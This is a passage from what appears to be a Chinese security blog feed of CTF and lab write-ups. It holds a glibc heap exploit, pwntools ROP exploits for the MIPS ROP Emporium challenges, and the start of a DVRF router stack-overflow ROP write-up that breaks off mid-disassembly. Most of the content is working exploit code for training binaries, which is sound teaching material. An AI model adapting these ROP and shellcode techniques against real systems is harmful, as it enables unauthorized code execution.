class="hljs-string">b&#x27;\n&#x27;</span>)<br>    decresae()<br>    initial()<br>    decresae()<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x10\xc0&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">1</span>)  + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>    increase(<span class="hljs-number">0x70</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    decresae()<br>    increase(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    mp = libcbase + <span class="hljs-number">2011848</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x1547a0</span><br>    setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>    pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>    pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c1e1</span><br>    pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>    ret = libcbase + <span class="hljs-number">0x25679</span><br>    mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>    increase(<span class="hljs-number">0x40</span>, p64(free_hook) + p64(stdout) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xd0</span>, p64(magic_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x140</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>    payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect) + p64(heap_addr + <span class="hljs-number">0x140</span> +<span class="hljs-number">0x70</span>)<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p64(heap_addr + <span class="hljs-number">0x140</span> + <span class="hljs-number">0x28</span>) + p64(ret)<br><br>    increase(<span class="hljs-number">0xe0</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    decresae()<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    <span class="hljs-keyword">try</span> :<br>        p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-Link DIR-645路由器溢出</title>
    <link href="/2022/11/15/DIR-645/"/>
    <url>/2022/11/15/DIR-645/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rop Emporinm(MIPS)几道题的wp</title>
    <link href="/2022/11/11/Rop-Emporinm(MIPS)/"/>
    <url>/2022/11/11/Rop-Emporinm(MIPS)/</url>
    
    <content type="html"><![CDATA[<p>与路由环境不同，这里所用到的是glibc，所以需要提前下载好相应的动态链接库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libc6-mipsel-cross<br></code></pre></td></tr></table></figure><p>​                       </p><p>MIPS动态库中的外部符号调用，是依赖<code>.got</code>段和<code>.MIPS.stubs</code>段来共同实现的，<code>.MIPS.stubs</code>类似于x86的<code>.plt</code>。</p><h4 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h4><p>直接找到函数ret2win地址去执行 system(“&#x2F;bin&#x2F;cat flag.txt”)，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2win_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2win_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(<span class="hljs-number">0x400a00</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h4><p>利用system的地址和flag.txt字符串的地址，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;split_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./split_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400a20</span><br><span class="hljs-comment">#sys_addr = 0x400b70</span><br>sys_addr = <span class="hljs-number">0x4009ec</span><br>cat_flag = <span class="hljs-number">0x411010</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(sys_addr) +p32(cat_flag)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h4><p>运行callme1，callme2，callme3函数，并传递正确的参数，在if语句中执行正确的分支，才会将flag输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;callme_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./callme_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>gadget = <span class="hljs-number">0x400bb0</span><br>callme_one = <span class="hljs-number">0x400d20</span><br>callme_two = <span class="hljs-number">0x400d80</span><br>callme_three = <span class="hljs-number">0x400d10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_one) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_two) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_three) + p32(key3) + p32(key2) + p32(key1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h4><p>通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;write4_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&quot;write4_mipsel&quot;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400930</span><br>print_file = <span class="hljs-number">0x400a90</span><br>pwnme = <span class="hljs-number">0x400a70</span><br>buf = <span class="hljs-number">0x411000</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;flag&#x27;</span> + p32(buf) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;.txt&#x27;</span> + p32(buf + <span class="hljs-number">4</span>) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget + <span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(print_file) + p32(buf)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h4><p>与write4一样，通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><p>但会对字符串判断，如果字符串中’有x’，’g’，’a’，’.’这些字符就会赋值为-21，可以通过xor加密绕过判断，</p><p>然后xor还原。和x86不同的是MIPS需要地址对齐才能正常取出字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;badchars_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./badchars_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400930</span><br>gadget2 = <span class="hljs-number">0x400948</span><br>gadget3 = <span class="hljs-number">0x400968</span><br>buf = <span class="hljs-number">0x411000</span><br><br>badchars = [<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>new_flag = <span class="hljs-string">&quot;&quot;</span><br>xor_byte = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c = <span class="hljs-built_in">ord</span>(i)  ^  xor_byte<br>        c =  <span class="hljs-built_in">chr</span>(c)<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> badchars:<br>            xor_byte += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            output += c<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">8</span>:<br>        new_flag = output<br>        <span class="hljs-keyword">break</span><br>new_flag = <span class="hljs-built_in">bytes</span>(new_flag.encode())<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + p32(<span class="hljs-number">0</span>) + new_flag[:<span class="hljs-number">4</span>] + p32(buf) + p32(gadget1)<br>payload += p32(<span class="hljs-number">0</span>) + new_flag[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>] + p32(buf + <span class="hljs-number">4</span>) + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf) + p32(xor_b)  + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_b)  + p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_byte &lt;&lt; <span class="hljs-number">24</span>)  + p32(gadget3) <br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x400ab0</span>) + p32(buf)<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h4><p>溢出后利用栈迁移修改foothold_function函数got表的地址为ret2win的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pivot_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./pivot_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400ca0</span><br>gadget2 = <span class="hljs-number">0x400cb0</span><br>gadget3 = <span class="hljs-number">0x400cc4</span><br>gadget4 = <span class="hljs-number">0x400cd0</span><br><br>foothold = <span class="hljs-number">0x400e60</span><br>foothold_got = <span class="hljs-number">0x412060</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pivot_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><br>payload1 = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(foothold)<br>payload1 += p32(<span class="hljs-number">0</span>) + p32(foothold_got) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(gadget3)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">32</span> + p32(pivot_addr) + p32(gadget4)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload2)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h4><p>使用glibc编译的·MIPS架构程序同样拥有libc_csu_init段，所以使用ret2csu调用ret2win函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2csu_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2csu_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x4009c0</span><br>gadget2 = <span class="hljs-number">0x4009a0</span><br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(<span class="hljs-number">0x411058</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(key1)<br>payload += p32(key2)<br>payload += p32(key3)<br>payload += p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVRF路由漏洞靶机中几道题的复现</title>
    <link href="/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><p>使用binwalk提取固件DVRF_v03.bin</p><p>本地环境：kali-2022.2，qemu-7.0</p><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="栈溢出分析"><a href="#栈溢出分析" class="headerlink" title="栈溢出分析"></a>栈溢出分析</h4><p>使用ida分析，使用strcpy了函数，只要不出现\x00字符，就可以实现栈溢出。</p><p>启动程序：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qemu-mipsel -L .<span class="hljs-regexp">/ -g 1234 ./</span>pwnable<span class="hljs-regexp">/ShellCode_Required/</span>stack_bof_02 aaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>关于溢出的字节数，我是直接用pwndbg观察栈上的地址和程序中的汇编计算出的：0x407ffdd0 + 0x214 -  0x407ffde8 &#x3D; 0x1fc</p><p>​       <img src="/img/5/Screenshot_20221110_055957.png" style="zoom:67%;" />        </p><p>​                                                                     </p><p>由于没有后门函数，这里可以使用shellcode，</p><ol><li>MIPS不支持NX保护，写入栈中的shellcode可以直接被执行；</li><li>使用ROP劫持控制流，虽然程序gadget很少，但libc文件中有大量的gadget，且qemu模拟无法做到地址随机化，libc的基地址每次启动也都是固定的；</li><li>由于缓存不一致性，指令cache和数据cache两者的同步需要一个时间来同步，否则就会失效；这里需要调用sleep函数来让shellcode从数据cache刷新到指令cache，然后在跳转到shellcode去执行。</li></ol><p>libc基地址的寻找：</p> <img src="/img/5/Screenshot_20221110_052742.png" style="zoom:67%;" /><p>查看puts函数的调用 ,然后在libc文件中找到偏移 0x3fefc420 - 0x17420  &#x3D; 0x3fee5000 （不同的环境模拟出的地址也会有所不同）</p><h4 id="编写ROP"><a href="#编写ROP" class="headerlink" title="编写ROP"></a>编写ROP</h4><p>这里我是参考H4lo师傅的<a href="https://www.cnblogs.com/H4lo/p/10542913.html">文章</a>去寻找的gadget</p><p>使用mipsrop找到的gadget跳转到指定地址大多都是通过另一个寄存器去赋值，而原程序中我们溢出后只能控制$ra寄存器，无法控制更多的寄存器；为了方便gadget的使用，首先溢出后劫持到scandir函数结尾部分，让我们可以控制更多的寄存器：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE0 <span class="hljs-number">3</span>C <span class="hljs-number">00</span> BF <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$ra</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s24</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE4 <span class="hljs-number">38</span> <span class="hljs-number">00</span> BE <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$fp</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s20</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> B7 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s7</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s1C</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFEC <span class="hljs-number">30</span> <span class="hljs-number">00</span> B6 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s6</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s18</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF0 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> B5 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s5</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s14</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF4 <span class="hljs-number">28</span> <span class="hljs-number">00</span> B4 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s4</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s10</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF8 <span class="hljs-number">24</span> <span class="hljs-number">00</span> B3 <span class="hljs-number">8</span>F                   lw      <span 